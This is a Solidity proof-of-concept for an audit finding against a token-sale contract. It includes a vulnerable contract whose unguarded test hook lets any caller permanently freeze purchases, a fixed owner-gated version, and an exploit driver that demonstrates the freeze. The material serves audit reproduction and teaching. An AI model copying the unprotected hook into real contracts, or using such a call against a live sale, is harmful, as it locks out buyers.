// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Harmonix Finance finding 63976:
// "[H-01] Anyone Can Finalize the Sale Early via testFinalizeSettlement()".
//
// HarTokenSale exposes a leftover test hook, testFinalizeSettlement(), that is
// `external` with NO owner check and NO time check. The finding's verbatim body:
//
//     function testFinalizeSettlement() external {
//         require(!settlementFinalized, "Settlement: finalized");
//         _finalizeSettlement();
//     }
//
// Any EOA can call it to flip settlementFinalized = true. Once flipped, every
// buyer's purchase() reverts on `require(!settlementFinalized)` — the sale is
// permanently frozen and allocations are locked at an attacker-chosen block.
// This is a pure liveness / DoS harm: no theft, but the sale is bricked for all
// participants. The magnitude of the harm (payment a fresh buyer can no longer
// commit) is recorded on a MARKER token minted to the SINK.
//
// The upstream repo (harmonixfi/core-contracts) is private/dead; source_status
// is embedded-solidity, so the vulnerable function is inlined verbatim into a
// minimal-but-faithful HarTokenSale. The boolean-flag guard on purchase() and
// the internal _finalizeSettlement() are the trivial, faithful surrounding that
// the finding itself describes ("flips settlementFinalized = true, freezing
// allocations and permanently blocking further purchases").
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/// @dev Minimal ERC20 double — stands in ONLY for the opaque payment token the
///      sale collects, and (separately instantiated) as the harm MARKER token.
contract MiniToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — testFinalizeSettlement() is the finding's verbatim body,
// unprotected `external`. purchase() is guarded by require(!settlementFinalized).
// ─────────────────────────────────────────────────────────────────────────────
contract HarTokenSale {
    IERC20 public paymentToken;
    address public owner;

    bool public settlementFinalized;

    uint256 public totalAccepted;
    mapping(address => uint256) public accepted;

    constructor(address _paymentToken) {
        paymentToken = IERC20(_paymentToken);
        owner = msg.sender;
    }

    /// @notice Buyers commit payment tokens and receive an allocation, until the
    ///         sale settlement is finalized. Guarded by the settlement flag.
    function purchase(uint256 amount) external {
        require(!settlementFinalized, "Sale: settlement finalized");
        require(amount > 0, "Sale: zero amount");
        paymentToken.transferFrom(msg.sender, address(this), amount);
        accepted[msg.sender] += amount;
        totalAccepted += amount;
    }

    // ── VERBATIM vulnerable function from the finding (contracts/token_sales/
    //    HarTokenSale.sol#L182-L185). External, no owner check, no time check. ──
    function testFinalizeSettlement() external { // @> unprotected public finalize: any EOA flips settlementFinalized and permanently freezes purchase()
        require(!settlementFinalized, "Settlement: finalized");
        _finalizeSettlement();
    }

    function _finalizeSettlement() internal {
        settlementFinalized = true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract — the team fixed by removing the public test hook. Here the
// finalize is owner-gated (equivalent: a non-owner can no longer freeze the
// sale), so purchases keep succeeding for everyone.
// ─────────────────────────────────────────────────────────────────────────────
contract HarTokenSaleFixed {
    IERC20 public paymentToken;
    address public owner;

    bool public settlementFinalized;

    uint256 public totalAccepted;
    mapping(address => uint256) public accepted;

    constructor(address _paymentToken) {
        paymentToken = IERC20(_paymentToken);
        owner = msg.sender;
    }

    function purchase(uint256 amount) external {
        require(!settlementFinalized, "Sale: settlement finalized");
        require(amount > 0, "Sale: zero amount");
        paymentToken.transferFrom(msg.sender, address(this), amount);
        accepted[msg.sender] += amount;
        totalAccepted += amount;
    }

    // FIX: finalize is restricted to the owner (public test hook removed).
    function testFinalizeSettlement() external {
        require(msg.sender == owner, "Sale: not owner");
        require(!settlementFinalized, "Settlement: finalized");
        _finalizeSettlement();
    }

    function _finalizeSettlement() internal {
        settlementFinalized = true;
    }
}

/// @dev Faithful buyer double: an independent address that holds payment tokens,
///      approves the sale, and purchases. `tryPurchase` observes the post-attack
///      revert without cheatcodes.
contract Buyer {
    MiniToken public token;
    address public sale;

    constructor(MiniToken _token, address _sale) {
        token = _token;
        sale = _sale;
    }

    function approveAll() external {
        token.approve(sale, type(uint256).max);
    }

    function purchase(uint256 amount) external {
        HarTokenSale(sale).purchase(amount);
    }

    /// @return ok true if the purchase succeeded, false if it reverted.
    function tryPurchase(uint256 amount) external returns (bool ok) {
        try HarTokenSale(sale).purchase(amount) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a fresh buyer purchases successfully; then any EOA (here, the
// Exploit itself — no privilege) calls testFinalizeSettlement(); afterwards every
// buyer's purchase() reverts. The blocked payment magnitude is marked to SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant PURCHASE_AMOUNT = 1000 ether;

    // Exposed results for the driver / Playground.
    bool public alicePurchasedOk;      // buyer succeeds BEFORE the attack
    uint256 public aliceAllocation;    // recorded allocation pre-attack
    bool public settlementFinalizedFlag; // flipped by the unprotected finalize
    bool public bobPurchaseBlocked;    // fresh buyer's purchase REVERTS after attack
    bool public alicePurchaseBlocked;  // existing buyer also frozen out
    uint256 public blockedAmount;      // payment magnitude now permanently frozen
    uint256 public sinkMarkerBalance;

    address public saleAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy the opaque payment token + the real vulnerable sale ---
        MiniToken pay = new MiniToken("Payment", "PAY");       // deploy 0
        HarTokenSale sale = new HarTokenSale(address(pay));    // deploy 1

        // --- two independent buyers ---
        Buyer alice = new Buyer(pay, address(sale));           // deploy 2
        Buyer bob = new Buyer(pay, address(sale));             // deploy 3

        // --- harm marker, minted to SINK to record frozen magnitude (LAST) ---
        MiniToken marker = new MiniToken("FrozenSale", "FROZEN-SALE"); // deploy 4

        saleAddr = address(sale);
        markerAddr = address(marker);

        // --- fund + approve both buyers ---
        pay.mint(address(alice), PURCHASE_AMOUNT);
        pay.mint(address(bob), PURCHASE_AMOUNT);
        alice.approveAll();
        bob.approveAll();

        // --- BEFORE attack: alice purchases successfully ---
        alice.purchase(PURCHASE_AMOUNT);
        aliceAllocation = sale.accepted(address(alice));
        alicePurchasedOk = aliceAllocation == PURCHASE_AMOUNT;

        // --- ATTACK: any unprivileged EOA finalizes the settlement early ---
        // The Exploit contract holds no owner role; this is the permissionless
        // freeze the finding describes.
        sale.testFinalizeSettlement();
        settlementFinalizedFlag = sale.settlementFinalized();

        // --- AFTER attack: a fresh buyer (bob) can no longer purchase ---
        bobPurchaseBlocked = !bob.tryPurchase(PURCHASE_AMOUNT);
        // ...and the existing buyer is frozen out of any further participation.
        alicePurchaseBlocked = !alice.tryPurchase(PURCHASE_AMOUNT);

        // --- HARM: bob's payment can never be committed; record it at SINK ---
        blockedAmount = PURCHASE_AMOUNT;
        marker.mint(SINK, blockedAmount);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
